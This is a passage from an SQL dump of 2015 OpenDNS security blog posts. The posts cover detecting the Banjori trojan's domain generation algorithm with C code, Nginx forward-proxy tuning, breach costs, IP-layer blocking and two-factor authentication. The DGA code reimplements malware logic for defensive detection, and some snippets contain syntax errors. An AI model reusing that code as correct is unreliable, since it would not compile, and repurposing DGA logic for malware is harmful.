then go to bed,” Mahjoub said. “You need to constantly update it, because the bad guys are doing the same thing on their end.”\nTo learn more about this new approach to security, check out the OpenDNS Security Labs blog and infographic.', 'Blog;Labs Research', 'https://umbrella.cisco.com/blog/2015/11/19/opendns-cracks-predictive-security/');

INSERT INTO `opendns` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1233, 'C is for Python', 'Chip McSweeney', 'November 12, 2015', 'Here at OpenDNS, we have handle a large amount of data. This comes in very handy for us researchers as we hunt for new threats, and bring to life new ways to protect our customers. Although I often describe my job as “playing with malware all day,” I neglect to mention that I follow the scientific method and engineer solutions out of the results. Python is a great tool, in that I can write programs to test my hypotheses and everyone can still read the program like well-written notes. While testing one of my most recent hypotheses however, I found that the solution although existed, it was incredibly slow in Python. Our goal is to find threats as early as possible and protect our customers from them before they are infected. Otherwise, we might as well be an antivirus company.\nHypothetical DGA\nThe majority of my recent work has revolved around something called a Domain Generation Algorithm (DGA). The fundamental concept of a DGA is that malware will use this algorithm to generate a series of domain names in a deterministic fashion. Computer science buzzwords aside, this means when malware tries to contact aaaa1111.com, then tries to contact aaab1112.com, it will likely continue by trying aaac1113.com, then aaad1114.com, etc. Assume each new domain is generated once per week and we want to block everything this DGA creates proactively. What domain is generated after aaaj1119.com has been used? If only all DGAs were this easy. It could be aaba1120.com, maybe aaak1120.com, maybe even aaaj111a.com if the last four digits are hexadecimal. It may not have even been safe to assume aaaj1119.com would ever be generated.  What if, after aaaf1116.com it generated aab01117.com?\nWell this is a fairly nice case, where time is not completely against me, and I can find a sample of malware that reaches out to these domains, reverse engineer it, find the DGA, rip it out, and make it talk. Hypothetically, lets say this DGA took a seed consisting of a number and a sequence of characters incrementing the number by one and the sequence of characters by one character until rolling over at 9 and z respectively for 100 domains before starting over. Good, aaaj1119.com does happen, the next is aaak1120.com, and aadw1211.com is the last domain generated. Block them all and job well done, right? Unfortunately not.\nAs is usually the case, this hypothetical malware uses a seed to start its DGA (aaaa and 1111). Every time an updated version of the malware is released, there’s probably a new seed. If this was malware built from a kit, you can bet on every buyer having their own seed. Not a problem, we can block everything that begins with letters and ends with numbers… until nobody can reach office365.com or see San Francisco news on KRON4.com or any other legitimate domain that potentially crosses paths with the DGA. This occurs frequently in DGA research, so it is important to be more targeted in attempts to thwart DGA implementations.\nContinuing with this hypothetical DGA, I know I have massive amounts of data to assist me. I can programmatically find every sequence of domain requests for each user for a domain beginning with characters and ending with numbers, and the following domain requested beginning with characters and ending with numbers. If the second one would be next in sequence from the first using that DGA, then success, but that’s just a single pair. Is it the beginning of a sequence, the middle, or the end? Well assuming the generation of 100 domains is never going to change, this one is relatively easy. I already know which IP is infected, and which domains are being requested, so it is nothing to lookup other users infected and full histories to find the first domain in the sequence. The first domain tells me the seed (new configuration) and I can then generate 100 in the future and be done with it. I can leave the program running and identify any new configurations almost immediately.\nPython’s limitations\nLets start with the fact the OpenDNS currently handles about 80 Billion DNS requests a day. Take a look. It is very difficult to keep up with almost a million anything per second, especially with a language that is not compiled and optimized. Add the complexity of a real DGA and you have to be very conservative with your clock cycles per test. Once you remind yourself that there are in fact many DGAs each with different characteristics, you realize quickly that you might be a day behind by the first minute you start analyzing. The ideal solution is to use C wherever possible (C++ for you object people).\nC is for Python\nThere are many ways to squeeze performance out of Python: Cython, PyPy, SWIG, etc., but my preferred method is to write the C as efficiently as possible for a performance dependent function (those related to the DGA especially), and wrap it manually for Python to import as a module. Why do I continue to use Python? Because it is easy for others to read and quick to modify; remember, the scientific method is an ongoing process, and modifications inevitable. The DGA however, does not change, and it is the most computationally complex, repetitive portion of my domain tests. So there is every reason to promote it to C as a Python module.\nA simple real example\nA banking trojan by the name Banjori had a pretty simple DGA. It took a seed domain like internetbadguys.com and only modified the first four characters to generate a series of domains.  An excellent resource on this particular DGA can be found here, including a very in-depth analysis on the algorithm itself. For each equation to generate the next letter, one of the characters is represented by its index in the alphabet (a=0, b=1, etc.), and the other characters involved are their ASCII integer. Those numbers are passed through the algorithm loosely represented below, and each new character is modulus 26 of the result added to 97 to get an ASCII character.\nBasic flow of Banjori DGA\nUsing the example internetbadguys[.]com, the next five domains generated are:\nfrqxrnetbadguys[.]com\nvpdbrnetbadguys[.]com\npfkcrnetbadguys[.]com\nkgmgrnetbadguys[.]com\njhnmrnetbadguys[.]com\nIf you’d like to follow along in C, this should help:\nvoid nextBanjori(unsigned char* domain) {\n  domain[0]=97+((domain[0]+domain[3]-97)%26);\n  domain[1]=97+((domain[0]+(domain[1]<<1)-97)%26);\n  domain[2]=97+((domain[0]+domain[2]-1-97)%26);\n  domain[3]=97+((domain[1]+domain[2]+domain[3]-97)%26);\n}\n\nAs mentioned in Johannes Bader’s blog, the DGA is cyclical, meaning at some point the next domain generated will have already been generated and it will loop from that point ad infinitum. Bader also makes mention of “tail words,” which lead into loops, but never enter them. That means there are always two four letter words that can generate any four letter word that are part of a loop, but no four letter word can ever generate a tail word. This also means about half all possible four letter words are tail words, and the remaining are part of a loop.\nEfficiency now matters\nI need a targeted approach to block the entire loop of domains, including the tail word used. That is, if the sequence started with a tail word (remember, there is about a 50 percent chance the seed domain is a tail word). From the sequential domain set that I have captured from a user, I need to quickly determine if it could be the result of this DGA.\nDiscard any domain shorter than [four letters] [‘.’] [top level domain] from the capture\nIs the length of the first domain equal to the length of the second domain?\nAre the substrings from the fifth element to the end for each domain equivalent?\nIf these are both true, they are candidates, and the DGA should be applied to the first domain.\nIf the first four letters of the domain post-DGA are now equivalent to the first four of the second domain, found one!\nStep one can be taken care of from whatever code monitors the domains from the stream of choice.  Steps two and three can be joined as one. Step four is already written, and step five can be a return true or false.\nint banjoriTest(unsigned char* domain1, unsigned char* domain2) {\n unsigned char[4] d1 = {domain1[0],domain1[1],domain1[2],domain1[3]};\n  int index = 4;\n  while(domain1[index]) {\n    if (!(domain1[index]==domain2[index])) {\n      return 0;\n    }\n  index++;\n  } \n  nextBanjori(d1);\n  for (index=0;index<4;index++) {\n    if (!(d1[index]==domain2[index])) {\n      return 0;\n    }\n  }\n  return 1;\n}\nThat looks fairly efficient, but no major complexity. So we’ll keep that on the back-burner and just use Python for the time being.\nAssume this program ran with the functions above and the following pair passed the test: vfxlsatformalisticirekb[.]com and zvogsatformalisticirekb[.]com.\nSweet, I have two of a chain which could be up to 15,373 domains long! Success? Not yet.\nI can block the entire loop right now. That sounds reasonable. Just continue with nextBanjori(domain2) repeatedly until I see domain2 again. Why not the first domain? Think about it, what if it was a tail domain. That loop could ruin your day. Now of course, you could alter it to break on the first or second domain, or serve yourself a nice heaping dish of the halting problem. You could even search the entire loop to see if the first domain was present. And if so, determine if it is or is not a tail word.\nIf the first domain is in the loop, is there a tail domain missing or was one not used?\nHelp has arrived!\nIntroducing, sliced bread!\n\nPattern searching abilities are now available!\nOk, not quite sliced bread, but an incredibly useful tool available through investigate and the investigate API. I’ll just take the regular expression of any four characters followed by the rest of our first domain.\nBanjori Domain Search\nPaydirt.\nNow I can cross-reference the the list I generated against the list from Investigate, and find the domain from Investigate that wasn’t generated, right? Guys? Right…? All 15,000 of them against the 16 found…?\nI know I’ve heard “memory is free” before, but there are other things running on these machines and I’m not the patient type. Milliseconds count.\nReversing the DGA\nNot reverse engineering the DGA, as that’s already been done. If I have the generated domain, can I find the domain that generated it? Of course! There are always two ways to try to do this.\nReverse the algorithm itself\nIterate through all possible inputs and push them through the algorithm until the correct answer pops out\nOne method will be slower, and reversing the algorithm isn’t always possible. But in this case, it is. I have managed to reverse it to a linear problem, rather than a search of size 26*26*26*26 (or 456,976). However, for the purpose of this example, we’re going to brute force this and pretend there is no other way, as is often the case.\nint isBanjoriTail(unsigned char* new) {\n  int c0,c1,c2,c3;\n  char[4] d;\n  for (c0=97;c0<123;c0++) {\n    for (c1=97;c1<123;c1++) {\n      for (c2=97;c2<123;c2++) {\n        for (c3=97;c3<123;c3++) {\n          d[0]=c0\n          d[1]=c1;\n          d[2]=c2;\n          d[3]=c3;\n          nextBanjori(d);\n          if (d[0]==new[0] && d[1]==new[1] && d[2]==new[2] && d[3]==new[3]) {\n            return 1;\n          }\n        }\n      }\n    }\n  }\n  return 0;\n}\nRemember, if anything can create the domain, it is not a tail.

Reading someone else’s code is only slightly more difficult than writing it yourself. So is it acceptable to put C code in the mix? Absolutely.\nIf the C function being wrapped for Python is cohesive, consistent, and could benefit from a speed boost, it is a perfect candidate. Speed is C’s best asset, and modularity is Python’s.  High speed C modules for Python? YES.

With credit score alert services, consultant fees, incident responder labor hours, legal fees, and communication efforts — not to mention a host of other costs —  Ponemon estimates the average breach to cost total at $1.57 million. The cost goes up if the breach involves a third party, from $154 per individual record to $170. Sixteen dollars might not seem monumental, but consider the average breach involves more than a million data records. In the health care industry, Ponemon says the average cost is even greater at $363 per record.\nDark Reading recently reported that as a result of the increasing costs, companies are turning to cyber insurance policies more as a risk management measure. And those companies are including liability clauses for third-party vendors. This might be because a large percentage of executives and cyber insurance policy holders that believe third-party vendors should be liable for damages if those vendors do not uphold their “due diligence.”\nThe most detailed and ongoing case study on the complications and snowballing fees involved with a high profile breach still belongs to Target. Most of the public, and even the bystanding victims of Target’s credit card breach, have likely moved on since the event in 2014. But for Target, the ordeal’s conclusion will not be anytime soon. In September a St. Paul district judge ruled that banks can levy their case against Target for costs associated to the breach, after the retail giant already paid a $67 million settlement to various financial institutions that had to issue new Visa cards. All for what started as a third-party vendor’s security oversight. Or was it? After all it was Target that first issued the vendor’s remote access to its HVAC systems. And Bloomberg reported that there were warnings that failed to spur action before the attack.\nSome industry analysts say what’s ultimately needed is a combined commitment to security from both third-party vendors, and the enterprises that employ them. And it might be best to start with the basics, as Drew Wilkinson, Booz Allen Hamilton senior associate and cyber risk expert, recently told Computer Weekly. Companies need to proactively manage their relationships with vendors to minimize risk, and periodically check in to make sure access levels and policies are as strict as they should be, Wilkinson said. Many companies, he said, do not even know what data third-party partners have access to, nor what data is most important. Deciding what data is most important, assessing security for all vendors, and prioritizing protection are also a good places to start.\nSoon security diligence may not be a choice on either side of business relationships. Government agencies are creating more laws to enforce good security practice, such as the HITECH Act for health care, the EU data protection legislation taking effect in 2016, and of course the Personal Data Protection and Breach Accountability Act from last year — which would have included not only fines but potential jail time. The bill died in Congress in 2014.\nSince business relationships with third parties will never go away, and neither will the liability issue when it comes to data breaches, it is a good idea for enterprises to get out in front of it. Open a dialogue with all third-party business partners and make sure the concerns and efforts around security are mutual. PWC — along with quite a few other consulting firms — has suggestions for implementing a third-party risk management program. Often the focus for these risk assessments is on financial institutions, but the same principles should apply to all third parties.

Today, we’re going to talk about Avalanche, a real-time data processing framework currently used in our research cluster.\nFirst, we have to run some numbers to evaluate the amplitude of our requirements and make smart architecture design decisions. Second, we will assess some similarities with other technical fields (such as quantitative trading in finance) that share very similar problematics, and see if we can find a common ground. Finally, we will expose some details and key elements of the Avalanche project.\nEvaluating the traffic\nBefore jumping into any design or implementation, we need to take a look at the amount of traffic that OpenDNS sees during slow and peak hours every day. I decided to take a look at the log collection from one of our resolvers located in Amsterdam. This resolver is comprised of several machines that handle  DNS queries, of which we’re going to consider only one (m1). It also sees various types of traffic, but here we will only focus on authoritative traffic (Authlogs) and recursive traffic (Querylogs). It is important to mention that the Amsterdam resolver, despite its significant amount of traffic, is not the biggest nor the smallest of our resolvers. Let’s take a look :\nAmsterdam being at GMT + 1 hour, noon is the peak moment of the day. Whereas the traffic around midnight is typically very slow. The upper part of the table shows the amount of data contained in each log chunk. Important to note here: each resolver produces one chunk every 10 minutes. The lower part of the table exposes the same information converted to queries per second.\nFor Authlogs, we observe a variation of 686.75 to 941.25 queries per second.\nFor Querylogs, we observe a variation of 5525.26 to 10246.66 queries per second.\nPut differently, authlogs peak at one message every 1.062 milliseconds, where querylogs peak at one message every 97 microseconds. These figures give a better understanding of the traffic volume and the precision level we’re dealing with here. Again, keep in mind that we have more resolvers all around the world all comprised of several machines averaging around these numbers.\nAnalogy with the finance world\nKnowing now that we have to build a log processor that will handle hundreds of data centers and apply active classification/decision techniques to the microsecond level on each one, it’s pretty hard to not see a correlation with quantitative trading in finance. (Also known as algorithmic trading).\nIn fact, the similarity is pretty striking. We see volumes of queries; financial analyst firms see volumes of trades. We have to deal with time series; they do too. Our data is centered around domain names (strings), and they have ticker symbols. Our logs contain additional data about the queries (Authlogs and Querylogs have different information); they see additional info about each trade. Our job consists of analyzing traffic patterns to detect anomalies and apply enforcement decisions and actions to Internet traffic; they do the same thing to compute investment strategies. They run back testing on simulations to measure the efficacy of their strategies; we replay historical logs to do pretty much the same (confusion matrix, hit rates, etc.). And finally, financial firms use external indicators (e.g., sentiment analysis on the news), while we take into account third-party APIs to cross-check our results.\nObviously, there are differences also. We see a virtually infinite number of domains; they have a limited number of stock symbols. We apply classification algorithms on the domain name itself (e.g., DGAs, typo-squatting…), and for financial institutions, it’s not really relevant to do so. They also don’t really have visibility over the originators of a trade; we see the client IPs and ASNs in our logs. However, despite some important differences, it’s important to realize that a lot of modern companies that manage heavy traffic loads have to solve very similar problems, involving very similar infrastructure and will therefore go for comparable design decisions.\nChoosing a robust messaging system\nThe foundation of our architecture relies on choosing the right messaging library. This will be a key factor to determine how well our data processing pipeline will perform. I will save you from all the details of a descriptive comparison between all the technology, but ZeroMQ is one of the best messaging middleware available, and it is very well known in the finance world. It also provides an amazing paradigm to build a distributed system with different message passing patterns. During my analysis, some important metrics caught my attention :\nSource: http://zeromq.org/results:rt-tests-v031\nThis benchmark was performed by sending one million messages using ZeroMQ. It shows the latency of each message on the Y axis. The graph on the left (pictured in black) shows the results with a standard Linux kernel. The one on the right shows the results obtained on a Real-Time kernel. The results also show an average latency of 23μs for the standard kernel, 33μs for the real-time one. This is in fact about three to four times faster than our Querylogs at peak time! This is looking very good so far.\nThere is a lot to be said about real-time systems in general and I’ll try not dwell too long on the subject here. It is however important to know that the term “real-time” is often misused. By real-time, most people mean “fast” and it is actually very far from the truth. Performing in real-time means that the process follows strict time constraints and observes strongly defined deadlines. We often differentiate between soft, firm, hard, and critical time constraints; these are all different levels of deadline observance that depends on what the real-time system is trying to accomplish. A program trying to play a video stream in real-time (soft) won’t be subjected to the same constraints as the program that triggers an airbag in a car (hard) or a cooling process of a nuclear reactor (critical). However, they all have a strong sense of how much time they have allowed to complete.\nThe graph on the right demonstrates this fact very well. The messages on average take more time to be sent (23μs to 33μs) but also never see any latency peak that would add unwanted non-determinism in our process.\nThat being said, in telecommunications we experience network-induced latency due to the type of protocol or cable that we are using. We typically refer to such processes as near real-time. The main take-away here is that this benchmark gives us a great perspective on the overall quality, reliability, and consistency of ZeroMQ. We also learn that we could move up to stronger real-time constraints if we need to. That could very well be the case if at some point we want to move our data processing pipeline in an embedded environment for example.\nDesigning our data processing pipeline\nLet’s now discuss some implementation choices: The first key aspect is modularity. In my opinion, this is the only way such a system could work. It offers plenty of flexibility and code reuse, and it makes changes easier to deploy and calibrate. The central piece of the puzzle is the avalanche node:\n\nAn avalanche node can be seen as a plugin that reads messages from an input queue, applies some processing on the message data and outputs the result to an output queue. These queues can be handled in different ways. Sometimes it makes sense to keep queuing messages to make sure no data is lost, sometimes it’s smarter to opt for a fire and forget strategy where we only want to process the most recent messages. Frequently, we choose to queue the messages until a certain high water mark value. Once that size is reached, we start dropping messages. This all depends on the volumes of messages received in input, the computing performance of the plugin and how we want to forward the messages to the next node. Here are two ways you can write an avalanche plugin:\n\nTypically, every node runs in its own thread. This allows the pipeline to take full advantage of highly parallel architectures containing multiple CPUs or cores. However our pipeline design can grow very fast, and we may end up running way too many threads compared to what the system could handle for an optimal configuration. This is where the need of grouping several nodes together on the same thread becomes important via the use of plugin racks. As you can see in the previous example, the first plugin only implements a process_message method and can be part of a sequence, while the second implements a full infinite loop and therefore has to run on its own. In other words, the first is rackable, while the second isn’t.\nNow that we’ve learned how to create modular plugins. Let’s connect them! Avalanche uses JSON files to load pipeline definitions. For example, let’s create a very simple pipeline looking like this:\n\nVery simple. Two plugins, the first one sending messages to the second. Here is how we would define it in the JSON file:\n\nEach node is defined in the nodes JSON array with a unique ID, they are then connected in the edges section. They can also receive parameters in the attributes section. What you put in there completely depends on your plugin and the way it works. It’s just an easy way to pass external options to the plugin, which are then passed to the plugin constructor.\nWhen your pipeline has reached some level of maturity, it may look more like this:\n\nIn this specific case, we have grouped some parts of the pipeline into racks. This allows us to decrease the number of threads used and gives us better clarity in the functional organization of the pipeline. In essence, a rack is a node running several plugins in sequence without any cycles. Here is how you would define a simple rack with the two previous plugins:\n\nOnce you have successfully implemented your plugins and pipeline definitions, all you have to do is start your avalanche pipeline with a simple command:\n$ ./avalanche.py path/to/your/pipeline.json\nGoing further\nWe’ve now covered the first part of this data processing pipeline. Today, we are excited to share with you the core piece of our code so you can start using it and build your own custom implementations. In upcoming articles, we will share additional pieces such as custom traffic classifiers or methods to scale your pipeline on larger clusters in order to take your processing power to the next level.\nHope you enjoyed this blog post, feel free to share feedback and your own custom plugins!\nReferences\nAvalanche Project\nZeroMQ Performance Tests', 'Big Data;Security Research;Security Tools;Threat Discovery', 'https://umbrella.cisco.com/blog/2015/11/05/the-avalanche-project-when-high-frequency-trading-meets-traffic-classification/');

Nginx was going to reverse proxy to Apache Traffic Server (ATS), which would do the actual forward proxying. Here is a simplified diagram:\n\nNginx turned out to be easy to understand and work with. This was in contrast with ATS, which is bigger, more complex, and just plain not fun. As a result, “Why don’t we just use Nginx for the whole thing?” became a popular question, especially after it was decided that the proxy will not be doing any caching.\nForward Proxy\nThough Nginx is a reverse proxy designed to be used with explicitly defined upstreams:\nhttp {\r\n upstream myapp1 {\r\n  server srv1.example.com;\r\n  server srv2.example.com;\r\n  server srv3.example.com;\r\n }\r\n\r\n server {\r\n  listen 80;\r\n  location / {\r\n   proxy_pass http://myapp1;\r\n  }\r\n }\r\n}\nIt’s also possible to configure it to use an upstream based on some variable, like the Host header:\nhttp {\r\n server {\r\n  listen 80;\r\n  location / {\r\n   proxy_pass http://$http_host$request_uri;\r\n  }\r\n }\r\n}\nThis actually works just fine. The main caveat is the Host header can match a pre-defined upstream{} in the config, if any exist:\nhttp {\r\n ...\r\n upstream foo {\r\n  server bar;\r\n }\r\n ...\r\n server {\r\n  listen 80;\r\n  location / {\r\n   proxy_pass http://$http_host$request_uri;\r\n  }\r\n }\r\n}\nThen a request like this will match foo and be proxied to bar:\nGET / HTTP/1.1\r\nAccept: */*\r\nHost: foo\nThe approach can be extended a bit with the use of new variables within a custom module, instead of the built-in $http_host and $request_uri for better destination control, error handling, etc.\nThat all works wonderfully — note that this is an HTTP (port 80) proxy and we are not considering the HTTPS case here; for one thing, Nginx does not recognize the CONNECT method used in explicit HTTPS proxying so that would never work. As I mentioned in my previous blog post, our Intelligent Proxy takes on a more unconventional approach in general.\nA big question is performance. Our initial load tests with ATS resulted in less-than-ideal numbers. Does this Nginx ‘hack’ have any effect on how well it performs?\nLoad Test\n\nSkipping over the finer details, our setup uses wrk as the load generator and a custom C program as the upstream. The custom upstream is very basic; All it does is accept connections and reply with a static binary blob to any request that looks like HTTP. Connections are never closed explicitly to remove any potential skew in the results from unnecessary extra TCP sessions.\nWe first establish a benchmark by loading the upstream server directly:\nRunning 30s test\r\n 10 threads and 100 connections\r\n Thread Stats Avg Stdev Max +/- Stdev\r\n Latency 3.27ms 680.48us 5.04ms 71.95%\r\n Req/Sec 3.21k 350.69 4.33k 69.67%\r\n 911723 requests in 30.00s, 3.19GB read\r\n 100 total connects (of which 0 were reconnects)\r\nRequests/sec: 30393.62\r\nTransfer/sec: 108.78MB\nEverything looks good, wrk created 100 connections as expected and managed to squeeze out 30k requests per second.\nNow let’s repeat that while going through our Nginx forward proxy (2 workers):\nRunning 30s test\r\n 10 threads and 100 connections\r\n Thread Stats Avg Stdev Max +/- Stdev\r\n Latency 6.42ms 14.37ms 211.84ms 99.50%\r\n Req/Sec 1.91k 245.53 2.63k 83.75%\r\n 552173 requests in 30.00s, 1.95GB read\r\n 5570 total connects (of which 5470 were reconnects)\r\nRequests/sec: 18406.39\r\nTransfer/sec: 66.53MB\nThis almost halves the possible throughput.. something is not right.\nDoing a few manual requests, we see that going through Nginx doesn’t really add any significant latency. The Nginx workers got close to 100% CPU usage during the test, but bumping the worker count doesn’t help much.\nWhat about the upstream, what does it see in the two cases?\nAfter a quick update to print some stats, everything looks good in the direct case — the numbers reported by wrk and the upstream server match up as expected. But we find something startling in the proxy case when looking at the upstream server stats:\nstatus: 552263 connects, 552263 closes, 30926728 bytes, 552263 packets\nLooks like Nginx created a new connection for every single request going upstream, even though wrk only made 100 connections downstream…\nDiving into the Nginx core and reading the documentation more thoroughly, things start to make sense. Nginx is a load balancer, where “load” equals requests, not connections. A connection can issue an arbitrary number of requests, and it’s important to equally distribute these among the backends. As it stands, Nginx closes upstream connections after each request. The upstream keepalive module tries to remedy this slightly by keeping a certain minimum number of persistent connections open at all times. Nginx Plus offers extra features like Session Persistence (and by the way, an equivalent open source module exists as well) — enabling requests to be routed to the same upstreams more consistently.\nWhat we really want is a 1-to-1 persistent connection mapping between clients and their respective upstreams. In our case, the upstreams are completely arbitrary and we want to avoid creating unnecessary connections, and more importantly not “sharing” upstream connections in any way. Our session is the whole client connection itself.\nThe Patch\nThe solution is fairly straightforward, and we’ve made it available on Github*.\nRe-running the load test with this change we get much better results, outlining the importance of keeping TCP connections persistent and avoiding those costly opens/closes:\nRunning 30s test\r\n 10 threads and 100 connections\r\n Thread Stats Avg Stdev Max +/- Stdev\r\n Latency 10.82ms 48.67ms 332.65ms 97.72%\r\n Req/Sec 3.00k 505.22 4.46k 95.81%\r\n 854946 requests in 30.00s, 3.02GB read\r\n 8600 total connects (of which 8500 were reconnects)\r\nRequests/sec: 28498.99\r\nTransfer/sec: 103.01MB\nThe numbers on the upstream match up to that of wrk:\nstatus: 8600 connects, 8600 closes, 47882016 bytes, 855036 packets\nThere is still a problem, however. There are 8,600 connections instead of just 100; Nginx decided to close a lot of connections both down and up stream. When debugging to see why, we end up tracing back to “lingering_close_handler”:\n...\r\nnginx: _ngx_http_close_request(r=0000000000C260D0) from ngx_http_lingering_close_handler, L: 3218\nnginx: ngx_http_close_connection(00007FD41B057A48) from _ngx_http_close_request, L: 3358\r\n...\nSince the overall performance even with this behavior is satisfactory, that’s where I left it for the time being.\nIn Closing\nWe’ve been running Nginx as a forward HTTP proxy in production for some time now, with virtually no issues. We hope to continue to expand Nginx’s capabilities and push new boundaries going ahead. Keep an eye out for future blog posts and code snippets/patches.\n*This is a rewritten patch (the original was a bit hacky), this new code has gone out to production just recently. If any issues creep up, I’ll update the public patch with any adjustments.', 'Community;Security Engineering', 'https://umbrella.cisco.com/blog/2015/11/03/lets-talk-about-proxies-pt-2-nginx-as-a-forward-http-proxy/');

Profits have a direct tie to eliminating downtime and keeping businesses running. Thus, any extra time can evaporate quickly if an MSP is constantly dealing with security issues like malware. Because of the lack of time, the most useful tool for an MSP is one that makes them more efficient.\n“All the tools MSPs use have to meet one of two criteria. It has to be something that either improves revenue or saves time,” Sagiss CTO Jim Lancaster said in an interview. He went on to say that prior to OpenDNS it was common for his time to spend several hours a week cleaning up a ransomware attack, which is time spent not being proactive.\nOpenDNS is releasing several updates to the Umbrella for MSPs dashboard that will make it easier to manage multiple customer networks. According to Senior Product Manager Dima Kumets the updates are focused on saving MSPs time, increasing their ability to be proactive and offer new opportunities at revenue. They include IP-level enforcement, centralized reporting and updates to search and reporting functions.\nCentralized Reporting\nBecause MSPs manage many accounts, a dashboard can be a tedious tool, having to looking into each account to find details on performance and security events. Kumets said the new updates to reporting will allow a single pane view of activity for all of an MSP’s customer accounts. This means being able to view any traffic spikes or botnet activity on one screen, rather than clicking through each account. It also gives MSPs a single pane ‘health check’ to make sure all customers are properly configured and protected.\n“It’s really about helping the MSP be more efficient with reporting and communication,” Kumets said.\nA view of the status report in the MSP console.\nA lot of times, being a good MSP means being relatively quiet. While no news is good news, MSP customers may at times wonder if they need an MSP service at all. But, according to Lancaster, this is a good thing.\n“When we’re doing our job well, the client doesn’t know we’re doing anything,” he said. “The closer we get to being transparent, the better our client experience is.”\nCentralized Cloud Services Report\nBack in June, OpenDNS released a reporting feature that allows sysadmins to search through network activity for cloud services. This could be apps like Dropbox, or sites like Facebook or Netflix. While the immediate conclusion could be to use the report for tracking employee behavior, MSPs can use the report to be proactive about warning their customers about breaches based on actual usage, meaning customers won’t get an e-mail blast about a security breach for a site they don’t even use.\nA view of the Cloud Services Report in the MSP console.\nMSPs specifically might also find it useful to see if customers are already using services that they sell. For example, Kumets said, “If I am introducing an MSP-managed file sync service, I can use the report to find customers using consumer services like Dropbox and rather than explaining the need for file sync, pitch them on the security and business value of having one that is properly MSP managed.” And because the Cloud Services Report is now centralized, it makes it very easy to get a single-pane view of SaaS use in one place, rather than click through each customer account the MSP manages.\nTo test drive these new features, log into your dashboard here and go to the Reports tab.

Today, OpenDNS announced a feature update that will further the company’s long-term goal to recreate the network security stack in the cloud and protect endpoints no matter where employees use them.\nFor years, malware authors relied on large numbers of cheap domain names to serve their attacks, because registrars can easily block or take down domains determined to be malicious. A small percentage of targeted attacks, however, use hardcoded IP addresses to initiate communication from within a company’s network, which bypasses the DNS security layer. OpenDNS Senior Product Marketing Manager Barry Fisher says IP enforcement will be key in this small percentage of attacks, providing protection for endpoints that are not on a company’s network or not always connected to a VPN.\nA recent example of direct-IP attacks include the Trojan “Upatre,” which uses direct IP connections to initiate further malware installs. In recent attacks, it delivered the Dyre trojan, which steals banking login credentials from infected computers. According to Fisher, this type of attack might be prevented if an employee is on a company network behind a firewall, but many security solutions only work on certain ports and only when an employee is working on site. Alternatively, OpenDNS’s IP layer enforcement provides protection over any port, and from any location through the use of the OpenDNS Roaming Client, an endpoint client that acts as a DNS request forwarder.\nIP layer enforcement works by checking traffic against a comprehensive list of suspect IP addresses from an OpenDNS threat intelligence database in realtime. If traffic from an endpoint matches an IP from the suspect list, it injects a route to OpenDNS servers and blocks the connection if it is malicious.\nThe IP layer enforcement feature is an update to OpenDNS Insights, Platform and MSP packages.

Though it ultimately ended up being just a close call and a huge headache, what Mat Honan went through benefitted everyone who read his tale by learning how to avoid it in the first place.\n“Had I used two-factor authentication for my Google account, it’s possible that none of this would have happened,” Honan wrote in retrospect. Two-factor authentication — or two-factor verification as some purists argue it should be titled — is the process of using a password plus something else to log into a site or app. The something else can be a temporary code delivered via SMS, a push request to an app like Authy, Google Authenticator, or Duo Mobile, or access to an e-mail account or hardware token to verify that the account owner is the one entering the correct password.\nHonan’s ultimate learning lesson is a simple one; passwords are not enough. Now, going on four years later, two-factor verification is gaining awareness, but is not yet pervasive. Many tech companies, some industry leaders, are lagging in making two-factor auth an option for users, despite handling highly sensitive data. But why exactly?\nAuthy Vice President and General Manager Marc Boroditsky believes we are living in a time where there really is no excuse for not offering two factor authentication. “User friction is the excuse companies would use five or six years ago, because tools were extremely complicated,” he said in an interview. “But now we have a wide array of tools available that are easy to implement.”\nExample of easy password policy settings from Atlassian.\nIf it’s easy enough to implement, why is it not more common? Boroditsky says it’s “shocking” comparing which industries have more of an offering for two-factor authentication. Gaming, he said, is an industry that so far has a much better adoption rate than finance or healthcare. Financial institutions typically apply their own behavioral analytics to find abnormal behavior and verify identity, or in some cases offer two-factor authentication by way of a hardware token. Some of them offer nothing at all. And some even restrict how long or complex a user password can be.\nIt’s easy to find out which apps and services support two-factor auth, and which apps do not, thanks to a few sites, including twofactorauth.org. Josh Davis, creator of the site has essentially made a living reference for two-factor adoption, and at the same time a platform for action to spur non-participating companies into action. From the site visitors can send a direct tweet in one click to any company to request they support two-factor auth, like a public spur to get on board.\nAs to why more companies don’t offer two-factor authentication, Davis said in an interview that he suspects that it’s partly the nature of prioritization and bureaucracy. Users aren’t exactly clamoring for a more complex login process, and engineers will never be without features to build or improve elsewhere. And while two-factor auth may not be flawless security, “it makes hacking accounts much harder,” Davis said.\nA screenshot from twofactorauth.org. The sites listed in pink do not offer 2FA.\nBoroditsky wagers that Internet users are reaching a tipping point. Incidents like the The Fappening — in which hackers stole celebrity images and videos by compromising their personal iCloud accounts — are helping to build a demand for more privacy and identity protection, including secure authentication. But the tipping point is not solely a demand in two-factor auth. “I can imagine a scenario where enough security problems happen with [Internet of everything] products and the sharing economy, that consumers start rejecting insecure products,” he said. “If enough of those events [like The Fappening] occur, people start to question ‘Why am I even putting that stuff up there?’”\nCompanies in all markets have the burden of tackling authentication by weighing security against the user base’s technical savvy. Those who have to cover all technical levels as well as age groups — like banks and health care companies for instance — run the risk of alienating an entire demographic and clogging support phone lines and ticket queues if they implement a login policy that is too strict or complicated.\nElectronic Frontier Foundation Activist Parker Higgins said many early adopters of two-factor auth benefitted from a more technical audience, but that there are examples of how it can be implemented smoothly and with community support. Twitter is one of them. The social media giant offered two-factor auth after a series of account hijacks using stolen passwords.\n“It’s good that [two-factor auth is] there,” he said, “but I think for the most part, depending on two-factor is not much better than depending on users creating more secure passwords.”\nBut in terms of choice between apps or services, the availability of two-factor auth can be a harbinger of good security practice behind the scenes. Higgins says it can be the equivalent of the “Van Halen brown M&M’s.” The rock band famously wrote a clause into every live performance contract that the venue should provide M&M’s in the dressing room with all the brown ones removed, and included it as a simple way to make sure venues were actually reading and following the technical details of contracts. This was the case with Slack, which offered two-factor auth after being hacked in March of this year as a way of proving they were taking security seriously.\nUltimately though, as Marc Andreessen said recently, some of the responsibility for security has to fall on the user. “Consumers at some point are going to have to learn to construct a good password,” he said during a podcast with A16z “It’s just going to be part of life to have to do two-factor authentication.”\nThis user responsibility might also include making two-factor authentication more of an issue by demanding it from the companies who provide the daily services we use.\nWhat are your thoughts? Is two-factor an important security measure or should we regroup and focus on banishing passwords altogether for something more secure? — Leave a comment here or tweet @opendns or @owen_lystrup.', 'Blog;Labs 